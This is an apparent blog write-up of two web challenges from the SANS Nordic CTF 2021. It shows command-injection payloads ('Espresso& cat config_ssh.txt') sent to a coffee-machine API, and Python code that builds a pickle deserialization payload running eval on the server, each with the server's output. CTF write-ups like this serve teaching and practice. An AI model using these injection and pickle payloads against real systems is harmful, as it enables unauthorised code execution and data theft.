SANS arranged the Nordic CTF 2021 and did a great job of providing different challenges in categories like web and crypto.

I will describe short how some of the web was solved.

First the tools you need:

* A browser with decent development tools. Personally I prefer Chrome (or Chromium) but Firefox is also great.
* A command like like on Linux or WSL on Windows
* Possibility to do some scripting in Python

# The IoT coffee machine

The coffee machine just keeps making coffee but will only make some variants of coffee.

Inspecting the network traffic reveals that it makes an XHR request with the following payload:

{% highlight python %}
{"coffee": "Espresso"}
{% endhighlight %}

First was tried to change the payload to a list.

Payload:
{% highlight python %}
{"coffee": ["Espresso"]}
{% endhighlight %}

Result:
{% highlight python %}
{"errorMessage": "can only concatenate str (not \"list\") to str", "errorType": "TypeError", "stackTrace": ["  File \"/var/task/lambda_function.py\", line 23, in lambda_handler\n    'body': command(event['coffee'])\n", "  File \"/var/task/lambda_function.py\", line 13, in command\n  combined = filtering(params)\n", "  File \"/var/task/lambda_function.py\", line 10, in filtering\n    return \"./coffeeController --type=\" + params\n"]}
{% endhighlight %}

Notice the last part. That looks like a command that can be run.

TIP: You can use the developer tool to get the request as a curl command to manipulate as you like.

Trying to get a command to run using the following payload:

{% highlight python %}
{"coffee":"Espresso& ls"}
{% endhighlight %}

The system would not accept ; as delimeter between command.

That payload resulted in this:

{% highlight python %}
{"statusCode": 200, "body": "Making Espresso...\ncoffeeController\nconfig_ssh.txt\n\n"}
{% endhighlight %}

From here is there only one payload left:

{% highlight python %}
{"coffee":"Espresso& cat config_ssh.txt"}
{% endhighlight %}

With the result:

{% highlight python %}
{"statusCode": 200, "body": "Making Espresso...\nFlag: IOTXXXXXXXnt\n\n"}
{% endhighlight %}

## The 1000 pts web

The Bonus x web challenge was a fun little challenge where you entered your named, reloaded the page and it shows your name.

Inspecting the traffic resulted in identifing that the client sent a python pickled dict to the server with the username in.

The following python code was used to generate some eval code that the server would evaluate and return the flag as name.

{% highlight python %}
import pickle
import base64

flag = 'FALSE'

class RCE:
    def __reduce__(self):
        return (eval,('{"name":flag}',))

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
{% endhighlight %}

This results in the following payload for the server:

{% highlight python %}
{"userdata":"gANjYnVpbHRpbnMKZXZhbApxAFgNAAAAeyJuYW1lIjpmbGFnfXEBhXECUnEDLg=="}
{% endhighlight %}

Sending this data will result in the eval being run and the following result from the server:

{% hightlight python %}
{"statusCode": 200, "body": "Hello, Flag: suPERXXXXXXXX02891", "headers": {"Access-Control-Allow-Origin": "*"}}
{% endhightlight %}
